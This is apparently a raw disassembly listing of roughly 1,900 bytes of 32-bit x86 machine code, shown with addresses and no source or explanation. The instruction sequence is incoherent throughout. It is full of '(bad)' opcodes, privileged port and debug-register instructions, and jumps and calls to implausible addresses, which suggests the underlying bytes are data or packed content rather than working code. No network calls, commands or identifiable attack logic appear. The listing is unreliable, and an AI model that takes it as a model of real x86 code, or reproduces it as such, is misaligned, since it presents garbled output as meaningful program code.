  427a77:	cmp    eax,ecx
  427a79:	or     BYTE PTR [edx+0x750114],al
  427a7f:	inc    DWORD PTR [ebp+0x18]
  427a82:	mov    eax,DWORD PTR [ebp-0x8]
  427a85:	mov    ebx,eax
  427a87:	(bad)  
  427a88:	retf   
  427a89:	inc    ebp
  427a8a:	into   
  427a8b:	mov    esi,eax
  427a8d:	int3   
  427a8e:	scas   eax,DWORD PTR es:[edi]
  427a8f:	push   es
  427a90:	mov    esi,DWORD PTR [ebp-0xc]
  427a93:	call   DWORD PTR [ebp+0x18]
  427a96:	sub    edi,DWORD PTR [ebp+0x3b]
  427a99:	mov    esi,DWORD PTR [edi-0x34]
  427a9c:	mov    eax,DWORD PTR [ebp-0x8]
  427a9f:	cmp    bl,al
  427aa1:	pushf  
  427aa2:	mov    bh,0xbc
  427aa5:	fadd   QWORD PTR [eax]
  427aa7:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  427aad:	mov    esi,DWORD PTR [ebx]
  427aaf:	in     al,0x33
  427ab1:	ret    
  427ab2:	add    eax,esi
  427ab4:	add    eax,DWORD PTR [ebp+0xf]
  427ab7:	mov    eax,ecx
  427ab9:	in     al,0x4d
  427abb:	ret    
  427abc:	mov    eax,esi
  427abe:	in     al,dx
  427abf:	inc    ebp
  427ac0:	rol    edi,1
  427ac2:	sar    al,1
  427ac4:	or     BYTE PTR [ebp+0x45e9f845],al
  427aca:	add    BYTE PTR [edx],bh
  427acc:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  427ad3:	test   ebx,eax
  427ad5:	clc    
  427ad6:	retf   
  427ad7:	inc    ebp
  427ad8:	into   
  427ad9:	cmp    al,0xc6
  427adb:	pushf  
  427adc:	scas   eax,DWORD PTR es:[edi]
  427add:	(bad)  
  427ade:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  427ae5:	inc    ebp
  427ae6:	cmp    edi,DWORD PTR [esi]
  427ae8:	ja     0x427a86
  427aea:	mov    eax,edi
  427aec:	mov    esp,0x458567a8
  427af1:	clc    
  427af2:	mov    eax,DWORD PTR [ebp-0x8]
  427af5:	mov    eax,ebx
  427af7:	in     al,dx
  427af8:	retf   
  427af9:	ret    
  427afa:	into   
  427afb:	mov    dh,0x7d
  427afe:	scas   eax,DWORD PTR es:[edi]
  427aff:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  427b05:	add    BYTE PTR [ebx],ch
  427b07:	jmp    0xb97c47
  427b0c:	mov    eax,DWORD PTR [ebp-0x5c]
  427b0f:	mov    eax,DWORD PTR [ebp-0x14]
  427b12:	inc    ebp
  427b13:	enter  0x458b,0xf8
  427b17:	xor    eax,ebx
  427b19:	add    ecx,ebx
  427b1b:	cmp    ecx,esi
  427b1d:	shufps xmm7,xmm4,0xaf
  427b21:	add    BYTE PTR [ebx+0x55e8f48b],cl
  427b27:	dec    ebp
  427b28:	sub    esi,DWORD PTR [ebx]
  427b2a:	cmp    esi,DWORD PTR [ebx]
  427b2c:	ja     0x427b31
  427b2e:	mov    eax,DWORD PTR [ebx]
  427b30:	lods   al,BYTE PTR ds:[esi]
  427b31:	mov    db0,ecx
  427b34:	inc    ebp
  427b35:	dec    ebp
  427b36:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  427b3c:	retf   
  427b3d:	rol    dh,1
  427b3f:	or     al,0xce
  427b41:	inc    ebp
  427b42:	scas   eax,DWORD PTR es:[edi]
  427b43:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  427b49:	add    BYTE PTR [ebx],ch
  427b4b:	add    BYTE PTR [ebx],bh
  427b4d:	inc    ebp
  427b4e:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  427b54:	inc    ebp
  427b55:	retf   
  427b56:	mov    ecx,esi
  427b58:	clc    
  427b59:	(bad)  
  427b5a:	retf   
  427b5b:	scas   eax,DWORD PTR es:[edi]
  427b5c:	ret    
  427b5d:	mov    ecx,esi
  427b5f:	hlt    
  427b60:	(bad)  
  427b61:	push   ebp
  427b62:	scas   eax,DWORD PTR es:[edi]
  427b63:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  427b69:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  427b6f:	add    BYTE PTR [ebx],al
  427b71:	mov    eax,eax
  427b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b74:	inc    ebp
  427b75:	dec    ebp
  427b76:	cmp    BYTE PTR [ebx],dh
  427b78:	pushf  
  427b79:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  427b7f:	(bad)  
  427b81:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  427b89:	sar    eax,1
  427b8b:	rol    BYTE PTR [ebp+0x5],1
  427b8e:	xor    eax,DWORD PTR [ebp+0x3]
  427b91:	jmp    0x427b7e
  427b93:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  427b99:	xor    eax,DWORD PTR [ebp+0x33]
  427b9c:	mov    eax,DWORD PTR [ebx]
  427b9e:	rol    BYTE PTR [ebx],1
  427ba0:	test   BYTE PTR [edi],cl
  427ba2:	cwde   
  427ba3:	shl    DWORD PTR [edx],0x4d
  427ba6:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  427bac:	xor    edx,eax
  427bae:	add    eax,DWORD PTR ds:0xeb4d45e0
  427bb4:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  427bba:	add    BYTE PTR [ebx],dh
  427bbc:	inc    ebp
  427bbd:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  427bc3:	rdpmc  
  427bc5:	rol    DWORD PTR [ebx],0x4d
  427bc8:	loopne 0x427b55
  427bca:	push   ebp
  427bcb:	in     al,dx
  427bcc:	mov    cl,dl
  427bce:	adc    eax,edx
  427bd0:	jb     0x427bd7
  427bd2:	add    BYTE PTR [ebp+0x45],al
  427bd5:	jmp    0x427b62
  427bd7:	mov    ebx,eax
  427bd9:	test   al,0xcb
  427bdb:	dec    ebp
  427bdc:	dec    ebp
  427bdd:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  427be3:	add    ebx,DWORD PTR [eax-0x743ecdf1]
  427be9:	dec    ebp
  427bea:	mov    al,0x8b
  427bec:	dec    ebp
  427bed:	in     al,dx
  427bee:	xor    edx,ecx
  427bf0:	xor    edx,eax
  427bf2:	add    eax,DWORD PTR [ebp+0x3]
  427bf5:	jbe    0x427c06
  427bf7:	mov    eax,ecx
  427bf9:	test   al,0x45
  427bfb:	dec    ebp
  427bfc:	mov    DWORD PTR [ebx],esi
  427bfe:	loopne 0x427c33
  427c00:	inc    ebp
  427c01:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  427c07:	rol    esi,0x45
  427c0a:	scas   eax,DWORD PTR es:[edi]
  427c0b:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  427c11:	mov    eax,ecx
  427c13:	hlt    
  427c14:	dec    ebp
  427c15:	inc    ebp
  427c16:	mov    eax,edi
  427c18:	loopne 0x427bf2
  427c1a:	retf   
  427c1b:	test   esi,ecx
  427c1d:	clc    
  427c1e:	scas   eax,DWORD PTR es:[edi]
  427c1f:	inc    ebp
  427c20:	mov    eax,edi
  427c22:	fdiv   st,st(0)
  427c24:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  427c2a:	cwde   
  427c2b:	cmp    dh,BYTE PTR [edx]
  427c2d:	pushf  
  427c2e:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  427c34:	inc    esi
  427c36:	mov    ebp,DWORD PTR [eax-0x10]
  427c39:	inc    ebp
  427c3a:	dec    ebp
  427c3b:	xor    esi,DWORD PTR [ebx]
  427c3d:	add    eax,DWORD PTR [ebx]
  427c3f:	loopne 0x427c50
  427c41:	dec    ebp
  427c42:	ror    DWORD PTR [edx+0x7233084d],0x3
  427c49:	add    BYTE PTR [ebx-0x7b740bbb],cl
  427c4f:	lock cwde 
  427c51:	ret    
  427c52:	xor    al,BYTE PTR [ebp-0x77]
  427c55:	mov    esi,esp
  427c57:	rol    BYTE PTR [ebp-0x7c],1
  427c5a:	xor    ebx,DWORD PTR [eax-0x7772cd47]
  427c60:	call   edi
  427c62:	enter  0x4d45,0x8b
  427c66:	mov    esi,eax
  427c68:	fmul   st(3),st
  427c6a:	push   ebp
  427c6b:	dec    ebp
  427c6c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  427c72:	ret    0xc198
  427c75:	xor    al,BYTE PTR [esi-0x280276]
  427c7b:	dec    ebp
  427c7c:	jne    0x427cb1
  427c7e:	mov    eax,DWORD PTR [ebx]
  427c80:	cld    
  427c81:	loopne 0x427c33
  427c83:	push   ebp
  427c84:	add    DWORD PTR [eax+0x72851100],ecx
  427c8a:	inc    DWORD PTR [eax]
  427c8c:	inc    DWORD PTR [ebp-0x75]
  427c8f:	mov    edi,esp
  427c91:	lock add bl,0x1
  427c95:	retf   
  427c96:	add    dh,al
  427c98:	xor    dh,cl
  427c9a:	inc    ebp
  427c9b:	scas   eax,DWORD PTR es:[edi]
  427c9c:	mov    eax,DWORD PTR [ebx]
  427c9e:	shl    al,0x0
  427ca1:	inc    ebp
  427ca2:	dec    DWORD PTR [ebx+0x4dccf0ff]
  427ca8:	call   0x458ee0
  427cad:	ud0    eax,ecx
  427cb0:	adc    al,0x4d
  427cb2:	inc    ebp
  427cb3:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  427cb9:	lock push 0x338055
  427cbf:	add    eax,DWORD PTR [eax]
  427cc1:	ud0    ecx,edx
  427cc4:	sbb    BYTE PTR [ebp+0x5e],dl
  427cc7:	xor    ecx,ecx
  427cc9:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  427cd0:	push   ecx
  427cd1:	add    BYTE PTR [ebp-0x38],cl
  427cd4:	mov    DWORD PTR [esi-0x740004],eax
  427cda:	cld    
  427cdb:	inc    ebp
  427cdc:	xchg   edx,eax
  427cdd:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  427ce3:	xabort 0xaf
  427ce6:	icebp  
  427ce7:	mov    esi,DWORD PTR [ebp-0x28]
  427cea:	(bad)  
  427ceb:	retf   
  427cec:	or     ecx,eax
  427cee:	(bad)  
  427cef:	dec    ebp
  427cf0:	pop    es
  427cf1:	(bad)  
  427cf2:	(bad)  
  427cf3:	or     BYTE PTR [esi],al
  427cf5:	jb     0x427cbd
  427cf7:	add    BYTE PTR [ebx],al
  427cf9:	inc    ebp
  427cfa:	(bad)  
  427cfb:	mov    ecx,DWORD PTR [edx]
  427cfd:	fadd   st(6),st
  427cff:	ret    
  427d00:	add    ch,BYTE PTR [eax-0x37]
  427d03:	int    0x55
  427d05:	sub    ebp,esp
  427d07:	add    edx,DWORD PTR [ecx-0x14]
  427d0a:	inc    ebp
  427d0b:	inc    ebp
  427d0c:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  427d12:	cld    
  427d13:	(bad)  
  427d14:	mov    gs,WORD PTR [edi+0xf893be0]
  427d1a:	mov    ebp,ebp
  427d1c:	clc    
  427d1d:	push   eax
  427d1f:	push   DWORD PTR [ebp-0x4]
  427d22:	mov    BYTE PTR [ebp+0xa],0xff
  427d26:	(bad)  
  427d27:	int3   
  427d28:	or     BYTE PTR [eax],al
  427d2a:	(bad)  
  427d2b:	lea    eax,[edi]
  427d2d:	ins    BYTE PTR es:[edi],dx
  427d2e:	(bad)  
  427d2f:	inc    DWORD PTR [ecx]
  427d31:	push   eax
  427d32:	mov    BYTE PTR [ebp+0x9],0x8b
  427d36:	leave  
  427d37:	les    edx,FWORD PTR [ebp+0x0]
  427d3a:	in     al,dx
  427d3b:	call   DWORD PTR [ecx-0x75]
  427d3e:	inc    ebp
  427d3f:	cld    
  427d40:	mov    DWORD PTR [eax+0x8b01fc],eax
  427d46:	cld    
  427d47:	xor    BYTE PTR [edi-0x76a8f98b],bh
  427d4d:	std    
  427d4e:	mov    eax,DWORD PTR [eax]
  427d50:	clc    
  427d51:	test   eax,esi
  427d53:	je     0x427dca
  427d55:	mov    eax,esi
  427d57:	cld    
  427d58:	add    al,0x80
  427d5a:	add    WORD PTR [ecx+0x0],ax
  427d5e:	fadd   QWORD PTR [eax]
  427d60:	mov    BYTE PTR [eax],0xd0
  427d63:	push   0xffffffc3
  427d65:	push   edi
  427d66:	mov    edx,DWORD PTR [eax+0x51]
  427d69:	pop    edi
  427d6a:	lea    ebx,[ebx-0x8]
  427d6d:	ret    0x45
  427d70:	mov    ecx,DWORD PTR [ebx-0x7241ae04]
  427d76:	xchg   eax,edi
  427d78:	mov    DWORD PTR [ebp-0x75],ecx
  427d7b:	push   esi
  427d7c:	clc    
  427d7d:	jne    0x427d4f
  427d7f:	mov    ecx,0xf8450b0b
  427d84:	(bad)  
  427d85:	push   cs
  427d86:	or     BYTE PTR [ebp-0x3a],dh
  427d89:	cmp    eax,DWORD PTR [ecx]
  427d8b:	pop    esi
  427d8c:	(bad)  
  427d8d:	or     al,0x5
  427d8f:	inc    eax
  427d90:	leave  
  427d91:	in     al,dx
  427d92:	add    al,0x42
  427d94:	push   esi
  427d95:	and    eax,0xedc940cf
  427d9a:	inc    DWORD PTR [eax-0x75]
  427d9d:	fmul   QWORD PTR [ebx-0xf8739be]
  427da3:	inc    eax
  427da4:	nop
  427da5:	jmp    0x518b:0x8b8bc3ff
  427dac:	(bad)  
  427dad:	lea    eax,ds:0xff45e8f8
  427db3:	push   esi
  427db4:	push   DWORD PTR [ebp-0x39]
  427db7:	mov    eax,0x7edda46
  427dbc:	or     al,0x6
  427dbe:	push   DWORD PTR [ebp-0x3a]
  427dc1:	cmp    eax,DWORD PTR [edx]
  427dc3:	pop    esi
  427dc4:	ret    
  427dc5:	or     al,0x56
  427dc7:	inc    ecx
  427dc8:	push   ebp
  427dc9:	js     0x427db7
  427dcb:	inc    edx
  427dcc:	inc    ebp
  427dcd:	int    0x1
  427dcf:	inc    ecx
  427dd0:	sub    BYTE PTR ds:0xe77541fc,ah
  427dd6:	add    DWORD PTR [edx+0x1c],eax
  427dd9:	int3   
  427dda:	mov    eax,ebx
  427ddc:	adc    al,0x8b
  427dde:	xchg   edx,eax
  427ddf:	push   ecx
  427de0:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  427de6:	rcl    DWORD PTR [esi-0x9],cl
  427de9:	jne    0x427e3b
  427deb:	mov    eax,0x7c80ece
  427df0:	rol    DWORD PTR [esi],cl
  427df2:	div    DWORD PTR [ebp+0x50]
  427df5:	cmp    ecx,edx
  427df7:	pop    esi
  427df8:	dec    BYTE PTR [edx]
  427dfa:	in     al,dx
  427dfb:	inc    edx
  427dfc:	sub    ebp,ecx
  427dfe:	inc    eax
  427dff:	(bad)  
  427e00:	push   eax
  427e01:	add    edx,DWORD PTR [eax-0x17]
  427e04:	push   edi
  427e05:	add    dh,dh
  427e07:	leave  
  427e08:	adc    DWORD PTR [ebp-0x1],0xffffffec
  427e0c:	add    BYTE PTR [ecx+0x0],dl
  427e0f:	inc    ebp
  427e10:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  427e16:	add    BYTE PTR [eax-0x7fbf448],bh
  427e1c:	add    al,0x2
  427e1e:	jmp    0x57e2978
  427e23:	jne    0x427e0d
  427e25:	mov    eax,DWORD PTR [edx]
  427e27:	or     BYTE PTR [eax],al
  427e29:	inc    ecx
  427e2a:	stc    
  427e2b:	in     eax,dx
  427e2c:	ss inc eax
  427e2e:	aas    
  427e2f:	out    0x7d,eax
  427e31:	inc    ecx
  427e32:	mov    esi,ecx
  427e34:	lock ret 0x7d
  427e38:	and    ecx,DWORD PTR [ebx-0x171777]
  427e3e:	add    bh,bh
  427e40:	aad    0xd7
  427e42:	add    dh,cl
  427e44:	clts   
  427e46:	(bad)  
  427e47:	call   0xffcd7d4c
  427e4c:	hlt    
  427e4d:	iret   
  427e4e:	jge    0x427e26
  427e50:	rol    DWORD PTR [esi-0x80],cl
  427e53:	icebp  
  427e54:	or     BYTE PTR [edi-0x27],cl
  427e57:	(bad)  
  427e58:	out    dx,al
  427e59:	mov    eax,DWORD PTR [ebx]
  427e5b:	(bad)  
  427e5c:	pop    esi
  427e5d:	push   es
  427e5e:	cmp    al,0xe8
  427e60:	sar    edi,0x8
  427e63:	inc    DWORD PTR [edi]
  427e65:	inc    esi
  427e66:	(bad)  
  427e67:	jmp    0x8b00:0x530e577e
  427e6e:	push   esi
  427e6f:	mov    eax,DWORD PTR [eax]
  427e71:	and    al,0x0
  427e73:	inc    ebp
  427e74:	push   eax
  427e75:	push   eax
  427e76:	add    DWORD PTR [ebx+0x757d1834],ecx
  427e7c:	sub    edx,DWORD PTR [esi-0x24]
  427e7f:	jne    0x427e37
  427e81:	lods   eax,DWORD PTR ds:[esi]
  427e82:	mov    edx,DWORD PTR [edx-0x34]
  427e85:	dec    esi
  427e86:	out    0x83,eax
  427e88:	into   
  427e89:	push   edi
  427e8b:	loopne 0x427e5b
  427e8d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  427e91:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  427e98:	rol    DWORD PTR [edx],0x8
  427e9b:	mov    esp,ecx
  427e9d:	cmp    DWORD PTR [ebx],0xc
  427ea0:	mov    esi,0x5001c0
  427ea5:	push   eax
  427ea6:	push   cs
  427ea7:	push   eax
  427ea8:	(bad)  
  427ea9:	sub    edx,edi
  427eab:	push   esi
  427eac:	adc    al,0xcb
  427eae:	ins    DWORD PTR es:[edi],dx
  427eaf:	mov    eax,0x203e8
  427eb4:	add    al,ah
  427eb6:	ror    BYTE PTR [eax+0xc007c0],0xc0
  427ebd:	add    dh,al
  427ebf:	add    ah,ch
  427ec1:	rol    DWORD PTR [ebx-0x3595fb0d],1
  427ec7:	pop    ecx
  427ec8:	or     eax,ebx
  427eca:	cli    
  427ecb:	add    BYTE PTR [ecx-0x4e728d1e],dh
  427ed1:	lea    ebp,[ebx]
  427ed3:	mov    edx,DWORD PTR [edx-0x4]
  427ed6:	dec    ecx
  427ed7:	inc    ebp
  427ed8:	shr    BYTE PTR [ebx],0x4b
  427edb:	and    al,0x0
  427edd:	(bad)  
  427ede:	jne    0x427f25
  427ee0:	pop    eax
  427ee1:	mov    al,0x5a
  427ee3:	call   0x1418142
  427ee8:	and    al,0x85
  427eea:	push   edx
  427eeb:	add    BYTE PTR [eax+eax*1+0x0],ah
  427eef:	dec    ebp
  427ef0:	mov    cl,0x23
  427ef2:	jmp    0x427ee0
  427ef4:	mov    al,0xe7
  427ef6:	call   0x13881e4
  427efb:	shr    DWORD PTR [eax+ebx*2],cl
  427efe:	lock (bad) 
  427f00:	adc    eax,0x757f008d
  427f05:	out    0x58,eax
  427f07:	cmp    al,0x7
  427f09:	pop    edx
  427f0a:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  427f11:	push   ecx
  427f12:	cld    
  427f13:	mov    esi,0x3b0175
  427f18:	and    al,0xb0
  427f1a:	xor    BYTE PTR [edx+0x1],0x8b
  427f1e:	add    ah,bh
  427f20:	mov    edi,DWORD PTR [ebp-0x4]
  427f23:	psubsw mm7,QWORD PTR [edi]
  427f26:	add    DWORD PTR [ebp+0x0],ebp
  427f29:	rcr    eax,1
  427f2b:	mov    edi,ecx
  427f2d:	and    eax,DWORD PTR [eax]
  427f2f:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  427f35:	call   0x12f821e
  427f3a:	add    al,cl
  427f3c:	mov    ebp,esi
  427f3e:	aam    0x83
  427f40:	or     DWORD PTR [ecx],eax
  427f42:	jne    0x427f35
  427f44:	mov    eax,DWORD PTR [eax]
  427f46:	aam    0x0
  427f48:	dec    ebp
  427f49:	jne    0x427ed6
  427f4b:	cmp    ebx,eax
  427f4d:	jb     0x427f9c
  427f4f:	jmp    0x427edc
  427f51:	mov    ebx,esp
  427f53:	int3   
  427f54:	dec    ebp
  427f55:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  427f5c:	mov    edx,0x8b0a8b
  427f61:	cmp    ecx,DWORD PTR [eax]
  427f63:	jb     0x427f3c
  427f65:	pop    edx
  427f66:	push   edi
  427f67:	cli    
  427f68:	pop    es
  427f69:	mov    eax,ecx
  427f6b:	jb     0x427f6f
  427f6d:	add    DWORD PTR [ebx],0xa
  427f70:	mov    eax,DWORD PTR [ebx]
  427f72:	int3   
  427f73:	add    bh,BYTE PTR [esi+0x75d10006]
  427f79:	jmp    0x427f06
  427f7b:	mov    al,0xe8
  427f7d:	call   0x10381ff
  427f82:	add    edx,DWORD PTR [ecx+ecx*8]
  427f85:	pop    edi
  427f86:	or     BYTE PTR [ecx-0x73],bl
  427f89:	pop    ecx
  427f8a:	inc    edi
  427f8b:	xor    al,0xeb
  427f8d:	push   ecx
  427f8e:	mov    edi,DWORD PTR [edx+0xc506cc]
  427f94:	call   0xb18099
  427f99:	int3   
  427f9a:	sbb    BYTE PTR [esi],ch
  427f9c:	inc    ebp
  427f9d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  427fa3:	call   0x9b8212
  427fa8:	or     BYTE PTR [ebx-0x73],dl
  427fab:	cmp    al,0x47
  427fad:	mov    al,0x1
  427faf:	jb     0x427fb1
  427fb1:	mov    al,0x10
  427fb3:	push   eax
  427fb4:	add    al,0x75
  427fb6:	add    BYTE PTR [ebx],ch
  427fb8:	add    ebx,esp
  427fba:	int3   
  427fbb:	jne    0x427fcd
  427fbd:	movsx  edx,cl
  427fc0:	add    DWORD PTR [eax],eax
  427fc2:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  427fc9:	mov    gs,edi
  427fcb:	add    BYTE PTR [eax-0x50],ch
  427fce:	add    al,ch
  427fd0:	mov    eax,DWORD PTR [ecx]
  427fd2:	sub    eax,DWORD PTR [eax]
  427fd4:	jb     0x42804b
  427fd6:	add    DWORD PTR [esp+eiz*8-0x50],esi
  427fda:	jge    0x427fc4
  427fdc:	add    al,0x1
  427fde:	add    DWORD PTR [eax],0x0
  427fe1:	jne    0x427fe3
  427fe3:	je     0x42802a
  427fe5:	mov    eax,DWORD PTR [edi]
  427fe7:	ror    BYTE PTR [ebp+0x4d],1
  427fea:	or     DWORD PTR [ecx+0x4d03d004],0x3
  427ff1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  427ff7:	mov    DWORD PTR [ebx],ebp
  427ff9:	fadd   DWORD PTR [eax+0x75]
  427ffc:	inc    eax
  427ffd:	pop    eax
  427ffe:	lea    ebx,[ecx+0x4f]
  428001:	push   0xb1000003
  428006:	out    dx,eax
  428007:	add    ebp,DWORD PTR [edx+edx*2]
  42800a:	add    BYTE PTR [ebx+ecx*4],bh
  42800d:	mov    ch,BYTE PTR [ebx]
  42800f:	jb     0x428083
  428011:	add    al,0x89
  428013:	push   eax
  428014:	call   0x842acd86
  428019:	add    DWORD PTR [eax+eax*1],eax
  42801c:	jae    0x428032
  42801e:	icebp  
  42801f:	inc    ebp
  428020:	mov    eax,DWORD PTR gs:[ecx]
  428023:	int3   
  428024:	out    dx,al
  428025:	loopne 0x428074
  428027:	sub    eax,DWORD PTR [edx]
  428029:	push   0xffffff83
  42802b:	pop    esi
  42802c:	push   cs
  42802d:	jl     0x428048
  42802f:	add    al,0xaf
  428031:	xor    eax,0x832b6d00
  428036:	mov    eax,DWORD PTR [edx]
  428038:	rcr    BYTE PTR [ebp+0x754500dc],cl
  42803e:	ror    DWORD PTR [ebx+0x7dc8e803],1
  428044:	inc    ebp
  428045:	shr    ebx,0x3
  428048:	or     DWORD PTR [eax],0x4
  42804b:	push   0xffffffa5
  42804d:	pop    esi
  42804e:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  428055:	jmp    0x4280b4
  428057:	mov    edi,0xff0272
  42805c:	fdivr  QWORD PTR [ebp+0x5d]
  42805f:	push   0x4e
  428061:	pop    ecx
  428062:	call   0x42c467
  428067:	mov    DWORD PTR [ebx],eax
  428069:	in     al,0xc8
  42806b:	rol    BYTE PTR [ebp-0x75],0xc1
  42806f:	call   0xac8250
  428074:	pop    esi
  428075:	enter  0xceff,0x8b
  428079:	repz mov ecx,DWORD PTR [ebp-0x34]
  42807d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  428084:	je     0x428086
  428086:	or     DWORD PTR [ebx-0x74183b24],eax
  42808c:	jne    0x428072
  42808e:	jmp    0x428089
  428090:	push   DWORD PTR [edx-0x24]
  428093:	push   0x4d
  428095:	pop    ecx
  428096:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  42809a:	jge    0x4280a2
  42809c:	mov    eax,eax
  42809e:	sub    ebp,DWORD PTR [edx+0x24]
  4280a1:	pop    esi
  4280a2:	inc    ebp
  4280a3:	mov    esp,0x8b6077
  4280a8:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4280ae:	lods   al,BYTE PTR ds:[esi]
  4280af:	add    BYTE PTR [ebx],bh
  4280b1:	enter  0xce73,0x49
  4280b5:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4280bd:	stc    
  4280be:	jge    0x428132
  4280c0:	jnp    0xdd42042f
  4280c6:	call   0xc5819c
  4280cb:	fadd   st(0),st
  4280cd:	dec    esi
  4280ce:	ins    BYTE PTR es:[edi],dx
  4280cf:	stc    
  4280d0:	cmp    al,0x73
  4280d2:	push   ebp
  4280d3:	mov    eax,0xf8028b
  4280d8:	jne    0x42809b
  4280da:	mov    esi,ecx
  4280dc:	mov    esp,DWORD PTR [ebp+0x2c]
  4280df:	add    edi,DWORD PTR [ebp-0x24]
  4280e2:	sub    esp,eax
  4280e4:	and    al,0x45
  4280e6:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  4280ec:	sbb    al,0xee
  4280ee:	pop    esi
  4280ef:	call   0x82811f
  4280f4:	fsubr  st,st(3)
  4280f6:	sti    
  4280f7:	add    BYTE PTR gs:[ecx],bh
  4280fa:	add    eax,esp
  4280fc:	add    DWORD PTR [esi],eax
  4280fe:	rol    DWORD PTR [ebp+0x8],0x29
  428102:	mov    esp,eax
  428104:	clc    
  428105:	jne    0x42817c
  428107:	mov    eax,0x8b0673
  42810c:	loopne 0x428153
  42810e:	loopne 0x428099
  428110:	lods   al,BYTE PTR ds:[esi]
  428111:	int3   
  428112:	inc    ebp
  428113:	mov    DWORD PTR gs:[eax+edi*8],eax
  428117:	add    al,0xc3
  428119:	sub    ecx,DWORD PTR [ebp+0x47]
  42811c:	(bad)  
  42811e:	shr    BYTE PTR [ebp-0x1f],0xe8
  428122:	add    eax,DWORD PTR [eax]
  428124:	call   0x6444229
  428129:	add    esi,DWORD PTR [esi-0x3b2efc83]
  42812f:	dec    esi
  428130:	ins    DWORD PTR es:[edi],dx
  428131:	in     al,dx
  428132:	lea    eax,[eax]
  428134:	inc    ebp
  428135:	inc    ebp
  428136:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  42813c:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  428146:	and    al,0xdc
  428148:	ror    DWORD PTR [edx+0x24],0xf7
  42814c:	or     BYTE PTR [ebp+0x4c],dh
  42814f:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  428153:	stos   BYTE PTR es:[edi],al
  428154:	adc    edx,edi
  428156:	inc    esp
  428157:	add    edi,DWORD PTR [eax]
  428159:	jne    0x42813e
  42815b:	mov    DWORD PTR [eax-0x7449db04],ecx
  428161:	cmp    ecx,DWORD PTR [edi]
  428163:	sub    BYTE PTR [ebp-0x7e],dl
  428166:	sar    ebp,0xb
  428169:	jmp    FWORD PTR [edi+0x2400392a]
  42816f:	sub    esi,DWORD PTR [ebx-0x73]
  428172:	mov    esp,DWORD PTR [ecx+edi*4]
  428175:	mov    ecx,DWORD PTR [eax]
  428177:	and    BYTE PTR [eax],al
  428179:	jne    0x428145
  42817b:	sub    ebp,ecx
  42817d:	sbb    BYTE PTR [esi+0x32],ah
  428180:	dec    ebp
  428181:	push   ebp
  428182:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  428188:	ret    
  428189:	mov    edx,ebp
  42818b:	leave  
  42818c:	sub    DWORD PTR [esi+0x24],ebx
  42818f:	ret    0x2b
  428192:	pop    ax
  428194:	push   ebp
  428195:	rol    BYTE PTR [ebx],0xeb
  428198:	add    DWORD PTR [ecx+0x6c0001],0x40
  42819f:	jb     0x4281f6
  4281a1:	ret    
  4281a2:	in     al,dx
  4281a3:	jecxz  0x428130
  4281a5:	push   esi
  4281a6:	xchg   esp,eax
  4281a7:	jne    0x4281a9
  4281a9:	cmp    edx,DWORD PTR [esi+0x1c]
  4281ac:	jne    0x428192
  4281ae:	mov    eax,DWORD PTR [ebp-0x77]
  4281b1:	ror    DWORD PTR [ebx+0x899408],0xe0
  4281b8:	mov    esi,DWORD PTR [ebp-0x75]
  4281bb:	pop    esi
  4281bc:	nop
  4281bd:	mov    eax,DWORD PTR [eax]
  4281bf:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4281c5:	add    al,0x0
  4281c7:	inc    ebp
  4281c8:	mov    eax,DWORD PTR [ebx]
  4281ca:	mov    ebp,ebx
  4281cc:	cmp    al,0xf
  4281ce:	or     al,al
  4281d0:	inc    ebp
  4281d1:	inc    ebp
  4281d2:	cmp    BYTE PTR [ebx+0x6c8bc89c],cl
  4281d8:	cld    
  4281d9:	add    BYTE PTR [edi+0x506c16c0],dh
  4281df:	add    BYTE PTR [ecx-0x5],dl
  4281e2:	add    eax,0x17200
  4281e7:	sbb    al,0x85
  4281e9:	dec    esp
  4281ea:	je     0x428224
  4281ec:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4281f0:	add    BYTE PTR [ebx],bh
  4281f2:	(bad)  
  4281f3:	and    al,0x39
  4281f5:	jae    0x428193
  4281f7:	mov    cl,cl
